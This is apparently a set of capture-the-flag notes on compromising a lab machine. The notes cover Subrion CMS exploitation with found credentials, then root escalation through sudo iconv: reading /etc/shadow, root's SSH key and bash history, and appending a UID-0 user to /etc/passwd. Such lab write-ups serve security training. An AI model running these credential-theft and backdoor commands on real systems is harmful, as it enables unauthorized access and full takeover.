[[nmap]]

[[ffuf]]

[[wpscan]]

[[smbclient]]

[[cyberchef.io]]

admin:Scam2021

[[searchsploit]] CMS subrion v4.2.1

```bash
head -n 20 49876.py
python3 49876.py -u http://10.10.25.125/subrion/panel/ -l admin -p Scam2021
```
[[Shell]]

[[wordpress]]
```bash
su scamsite
ImAScammerLOL!123!
```
```bash
sudo -l
```
NOPASSWD: /usr/bin/iconv

[[GTFOBins]]
iconv

```
LFILE=file_to_read
iconv -f 8859_1 -t 8859_1 "$LFILE"
```

*Crack root hash*
```bash
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /etc/shadow
```
*Get root ssh key*
```bash
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/.ssh/id_rsa
```

> [!NOTE] Local machine
> Contents
> ```bash
vim root_id_rsa
chmod 600 root_id_rsa
ssh root@10.10.26.125 -i root_id_rsa
ssh2john root_id_rsa > id_rsa

*Check root bash history*
```bash
sudo /usr/bin/iconv -f 8859_1 -t 8859_1 /root/.bash_history
```

*Write to file etc/passwd*
```bash
echo "DATA" | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /tmp/test
cat /tmp/test

openssl passwd -1 pass
head -n 1 /etc/passwd
echo 'root2:$1$MdOU2LrC$MJ53Sq1G.IyQFGjLNZvEr.:0:0:root:/root:/bin/bash' >> passwd
cat passwd
cat passwd | sudo /usr/bin/iconv -f 8859_1 -t 8859_1 -o /etc/passwd
tail /etc/passwd
su root2
password:pass
whoami
cd /root
ls
```


